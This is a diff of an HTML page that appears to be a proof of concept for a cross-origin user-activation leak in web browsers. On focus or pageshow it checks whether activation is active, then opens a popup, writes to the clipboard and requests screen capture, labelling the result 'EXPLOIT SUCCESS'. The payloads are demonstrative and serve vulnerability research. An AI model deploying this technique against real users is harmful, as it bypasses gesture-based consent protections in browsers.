@@ -9,36 +9,46 @@
 <body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
     <h1>Target Page (Target Origin)</h1>
     <p>User Activation Status: <b id="act-status">Checking...</b></p>
-
     <script>
-        let triggered = false;
-
-        function checkAndExploit(triggerSource) {
-            const isActive = navigator.userActivation.isActive;
-            const statusElement = document.getElementById('act-status');
-
-            statusElement.innerText = isActive ? "VULNERABLE (LEAKED!)" : "INACTIVE (NORMAL)";
-            statusElement.style.color = isActive ? "red" : "green";
-
-            console.log(`[${triggerSource}] Activation state:`, isActive);
-
-            if (isActive && !triggered) {
-                triggered = true;
-
-                console.log("[!] Activation leak detected. Triggering getDisplayMedia...");
-
-                navigator.mediaDevices.getDisplayMedia({ video: true })
-                    .then(() => {
-                        alert("EXPLOIT SUCCESS:\n\nUser Activation leaked across origins.\ngetDisplayMedia triggered without fresh gesture.");
-                    })
-                    .catch(e => {
-                        console.log("API blocked:", e.message);
-                    });
-            }
+    let triggered = false;
+    async function runExploit() {
+        console.log("[!] Activation leak confirmed. Testing multiple APIs...");
+        try {
+            window.open("https://example.com", "_blank");
+            console.log("[+] Popup opened from leaked activation");
+        } catch (e) {
+            console.log("[-] Popup blocked:", e.message);
         }
-        window.addEventListener("focus", () => checkAndExploit("focus"));
-        window.addEventListener("pageshow", () => checkAndExploit("pageshow"));
-    </script>
+        try {
+            await navigator.clipboard.writeText("pwned-by-activation-leak");
+            console.log("[+] Clipboard write succeeded");
+        } catch (e) {
+            console.log("[-] Clipboard blocked:", e.message);
+        }
+        try {
+            await navigator.mediaDevices.getDisplayMedia({ video: true });
+            alert("EXPLOIT SUCCESS:\n\nCross-origin user activation leak confirmed.\nMultiple gesture-gated APIs were accessible.");
+        } catch (e) {
+            console.log("[-] getDisplayMedia blocked:", e.message);
+        }
+    }
+    function checkAndExploit(triggerSource) {
+        const isActive = navigator.userActivation.isActive;
+        const statusElement = document.getElementById('act-status');
+
+        statusElement.innerText = isActive ? "VULNERABLE (LEAKED!)" : "INACTIVE (NORMAL)";
+        statusElement.style.color = isActive ? "red" : "green";
+
+        console.log(`[${triggerSource}] Activation state:`, isActive);
+
+        if (isActive && !triggered) {
+            triggered = true;
+            runExploit();
+        }
+    }
+    window.addEventListener("focus", () => checkAndExploit("focus"));
+    window.addEventListener("pageshow", () => checkAndExploit("pageshow"));
+</script>
 </body>
 
 </html>
